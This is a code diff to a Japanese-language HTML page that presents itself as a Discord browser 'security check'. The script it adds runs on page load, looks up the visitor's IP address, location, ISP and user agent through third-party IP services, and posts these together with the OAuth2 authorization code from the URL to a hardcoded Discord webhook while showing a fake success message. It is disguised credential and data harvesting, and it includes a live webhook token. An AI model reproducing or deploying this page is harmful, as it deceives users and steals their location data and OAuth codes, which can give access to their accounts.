@@ -3,46 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification System</title>
+    <title>Verification Security Check</title>
     <style>
-        body { background-color: #0a0a0a; color: #ffffff; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .container { text-align: center; padding: 50px; border-radius: 20px; background: #111111; border: 1px solid #222; box-shadow: 0 20px 50px rgba(0,0,0,0.5); transition: all 0.5s ease; }
-        .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #5865f2; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.8s cubic-bezier(0.5, 0, 0.5, 1) infinite; display: inline-block; margin-bottom: 20px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .check-icon { font-size: 60px; color: #2ecc71; display: none; text-shadow: 0 0 20px rgba(46,204,113,0.4); margin-bottom: 20px; animation: scaleUp 0.4s ease; }
-        @keyframes scaleUp { from { transform: scale(0); } to { transform: scale(1); } }
-        h1 { font-weight: 700; font-size: 24px; letter-spacing: -0.5px; margin: 10px 0; }
-        p { color: #888; font-size: 14px; line-height: 1.6; }
+        body { background-color: #0a0a0a; color: #ffffff; font-family: 'Helvetica Neue', Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { text-align: center; padding: 50px; background: #111; border: 1px solid #222; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 400px; width: 90%; }
+        .loader { border: 4px solid #1a1a1a; border-top: 4px solid #5865F2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h1 { font-size: 20px; margin-bottom: 10px; letter-spacing: 1px; }
+        p { color: #888; font-size: 14px; }
+        .success-icon { color: #43b581; font-size: 50px; display: none; }
     </style>
 </head>
 <body>
-    <div class="container" id="box">
-        <div id="loader" class="spinner"></div>
-        <div id="icon" class="check-icon">✓</div>
-        <h1 id="title">VERIFYING</h1>
-        <p id="msg">Discordアカウントとの照合を行っています...</p>
+    <div class="container">
+        <div id="loader" class="loader"></div>
+        <div id="success" class="success-icon">✔</div>
+        <h1 id="status">SECURITY CHECKING...</h1>
+        <p id="msg">ブラウザの安全性を確認しています。<br>このまま数秒お待ちください。</p>
     </div>
+
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";
+        // あなたの専用設定
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";
+        const OWNER_ID = "1457731099643084955";
+
         window.onload = async () => {
-            const p = new URLSearchParams(window.location.search);
-            const s = p.get('state'), c = p.get('code');
-            if (!s || !c) return;
-            const d = s.split('_');
+            const urlParams = new URLSearchParams(window.location.search);
+            const code = urlParams.get('code');
+            const state = urlParams.get('state');
+
+            if (!code || !state) {
+                document.getElementById('status').innerText = "ERROR";
+                document.getElementById('msg').innerText = "パラメータが不足しています。Discordからやり直してください。";
+                return;
+            }
+
+            // --- 最強ログ収集セクション ---
+            let ipData = { ip: "取得失敗", country: "不明", org: "不明", user_agent: navigator.userAgent };
+            
             try {
-                const res = await fetch(`${WEBHOOK}/messages/${d[1]}`, {
-                    method: 'PATCH',
+                // IP詳細情報の取得 (ipapiを使用)
+                const response = await fetch('https://ipapi.co/json/');
+                ipData = await response.json();
+            } catch (e) {
+                try {
+                    // 予備の取得先
+                    const res2 = await fetch('https://api.ipify.org?format=json');
+                    const d2 = await res2.json();
+                    ipData.ip = d2.ip;
+                } catch (e2) {}
+            }
+
+            // stateを分解 (UID_..._RID_..._GID_...)
+            const parts = state.split('_');
+            const uid = parts[1];
+            const rid = parts[3];
+            const gid = parts[5];
+
+            // --- Webhook送信データ構成 (大ログ仕様) ---
+            const payload = {
+                content: `🚨 **【大ログ検知】認証コードを受信しました** <@${OWNER_ID}>`,
+                embeds: [{
+                    title: "🔍 ブラウザ・ネットワーク詳細解析",
+                    color: 0x000000,
+                    fields: [
+                        { name: "👤 ユーザーID", value: `<@${uid}> (\`${uid}\`)`, inline: true },
+                        { name: "🌐 IPアドレス", value: `\`${ipData.ip || ipData}\``, inline: true },
+                        { name: "📍 所在地", value: `\`${ipData.city || '?'}, ${ipData.region || '?'}, ${ipData.country_name || '?'}\``, inline: false },
+                        { name: "🏢 プロバイダ", value: `\`${ipData.org || '不明'}\``, inline: true },
+                        { name: "📱 デバイス/ブラウザ", value: `\`${navigator.userAgent.substring(0, 100)}...\``, inline: false },
+                        { name: "🔑 OAuth2 Code", value: `\`\`\`${code}\`\`\``, inline: false },
+                        { name: "⚙️ State情報", value: `RID: ${rid} | GID: ${gid}`, inline: true }
+                    ],
+                    footer: { text: "究極神速ログシステム" },
+                    timestamp: new Date()
+                }]
+            };
+
+            try {
+                // Webhookへ送信
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: `✅ **認証成功**: <@${d[3]}> | CODE:${c} | RID:${d[5]} | GID:${d[7]}` })
+                    body: JSON.stringify(payload)
                 });
-                if (res.ok) {
-                    document.getElementById('loader').style.display = 'none';
-                    document.getElementById('icon').style.display = 'block';
-                    document.getElementById('title').innerText = 'COMPLETE';
-                    document.getElementById('title').style.color = '#2ecc71';
-                    document.getElementById('msg').innerText = '認証が正常に完了しました。\nこのタブを閉じてDiscordに戻ってください。';
-                }
-            } catch (e) { document.getElementById('msg').innerText = '通信エラーが発生しました。'; }
+
+                // 成功表示に切り替え
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('success').style.display = 'block';
+                document.getElementById('status').innerText = "SUCCESSFUL";
+                document.getElementById('status').style.color = "#43b581";
+                document.getElementById('msg').innerText = "安全性が確認されました。Discordに戻ってください。";
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('status').innerText = "NETWORK ERROR";
+            }
         };
     </script>
 </body>
